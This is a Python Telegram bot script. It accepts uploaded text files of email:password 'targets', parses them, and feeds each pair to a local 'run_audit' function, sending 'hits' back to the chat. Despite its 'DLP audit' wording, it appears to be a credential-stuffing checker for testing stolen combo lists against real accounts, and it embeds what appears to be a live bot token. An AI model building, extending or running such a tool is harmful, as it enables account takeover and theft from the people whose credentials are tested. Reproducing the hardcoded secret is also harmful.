#!/usr/bin/env python3
import requests
import time
import os
import json
import threading
import sys

# ══════════════════════════════════════════════════
# CONFIGURATION
# ══════════════════════════════════════════════════
TELEGRAM_BOT_TOKEN = "8741495811:AAEOFBaW9QfFOpVWfW6kyogJskS7y4wVTIs"
TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"
DLP_API_URL = "http://localhost:5050/api/audit"

# You can restrict this to your specific group ID to prevent abuse.
# Leave blank to accept from anyone who messages the bot.
ALLOWED_CHAT_ID = "" 

DOWNLOAD_DIR = "incoming_targets"

# ══════════════════════════════════════════════════
# INIT
# ══════════════════════════════════════════════════
if not os.path.exists(DOWNLOAD_DIR):
    os.makedirs(DOWNLOAD_DIR)

class DummyQueue:
    def put(self, item):
        pass # Discard SSE events during background headless scanning

def send_telegram_message(chat_id, text):
    url = f"{TELEGRAM_API_URL}/sendMessage"
    requests.post(url, json={"chat_id": chat_id, "text": text})

def download_file(file_id, save_path):
    # 1. Get File Path
    res = requests.get(f"{TELEGRAM_API_URL}/getFile?file_id={file_id}")
    if res.status_code == 200:
        file_path = res.json()["result"]["file_path"]
        
        # 2. Download actual file
        dl_url = f"https://api.telegram.org/file/bot{TELEGRAM_BOT_TOKEN}/{file_path}"
        r = requests.get(dl_url)
        if r.status_code == 200:
            with open(save_path, "wb") as f:
                f.write(r.content)
            return True
    return False

def process_file_and_scan(file_path, chat_id, keyword=""):
    send_telegram_message(chat_id, "📥 Archivo recibido. Iniciando Auditoría DLP automática...")
    
    # 1. Read file
    creds_text = ""
    with open(file_path, "r", encoding="utf-8") as f:
        creds_text = f.read()
    
    # 2. Extract pairs
    raw_pairs = [line.strip() for line in creds_text.split('\n') if line.strip()]
    valid_creds = []
    for pair in raw_pairs:
        # allow email:pass OR email pass OR pass email
        parts = pair.split(':')
        if len(parts) == 2:
            valid_creds.append(f"{parts[0]}:{parts[1]}")
    
    if not valid_creds:
        send_telegram_message(chat_id, "❌ Error: No se encontraron credenciales con formato 'correo:password' en el archivo.")
        return
        
    send_telegram_message(chat_id, f"✅ Parsed {len(valid_creds)} targets. Processing in background. Hits will be sent to Chat ID: {chat_id}.")
    
    # 3. Import and Trigger run_audit Headlessly
    # We add the local directory to sys.path to import server.py
    sys.path.append(os.path.dirname(os.path.abspath(__file__)))
    try:
        from server import run_audit
    except ImportError as e:
        send_telegram_message(chat_id, f"❌ Error: Could not import DLP server backend: {e}")
        return
        
    dummy_q = DummyQueue()
    
    for cred in valid_creds:
        email, pwd = cred.split(':', 1)
        try:
            # We call run_audit synchronously for each item. 
            # We pass the triggering Telegram Chat ID to `tg_chat_id` so hits route back here.
            run_audit(dummy_q, email.strip(), pwd.strip(), keyword=keyword, sender="", proxy_dict=None, tg_chat_id=chat_id, multi_user=True)
        except Exception as e:
            print(f"Error scanning {email}: {e}")
            
    send_telegram_message(chat_id, f"🏁 Auditoría de {len(valid_creds)} objetivos finalizada.")

def poll_telegram():
    print(f"📡 Inciando Telegram Listener Daemon...")
    print(f"📁 Guardando archivos entrantes en ./{DOWNLOAD_DIR}/")
    offset = 0
    
    while True:
        try:
            url = f"{TELEGRAM_API_URL}/getUpdates?offset={offset}&timeout=30"
            res = requests.get(url, timeout=35) # long poll for 30s
            
            if res.status_code == 200:
                updates = res.json().get("result", [])
                
                for update in updates:
                    offset = update["update_id"] + 1
                    msg = update.get("message", {})
                    
                    chat_id = str(msg.get("chat", {}).get("id", ""))
                    if not chat_id: continue
                    
                    # Optional Whitelist Check
                    if ALLOWED_CHAT_ID and chat_id != ALLOWED_CHAT_ID:
                        print(f"Ignored message from unauthorized chat: {chat_id}")
                        continue

                    # Check for Document
                    doc = msg.get("document")
                    if doc:
                        file_name = doc.get("file_name", "").lower()
                        mime_type = doc.get("mime_type", "")
                        
                        if file_name.endswith(".txt") or mime_type == "text/plain":
                            file_id = doc["file_id"]
                            caption = msg.get("caption", "").strip() if msg.get("caption") else ""
                            
                            local_path = os.path.join(DOWNLOAD_DIR, f"{int(time.time())}_{file_name}")
                            
                            print(f"[+] Download requested: {file_name} from {chat_id}")
                            if download_file(file_id, local_path):
                                print(f"    -> Saved to {local_path}. Starting process thread.")
                                t = threading.Thread(target=process_file_and_scan, args=(local_path, chat_id, caption))
                                t.start()
                            else:
                                send_telegram_message(chat_id, "❌ Falló la descarga del archivo.")
                                
        except Exception as e:
            print(f"Poll Error: {e}")
            time.sleep(5)
            
if __name__ == "__main__":
    poll_telegram()
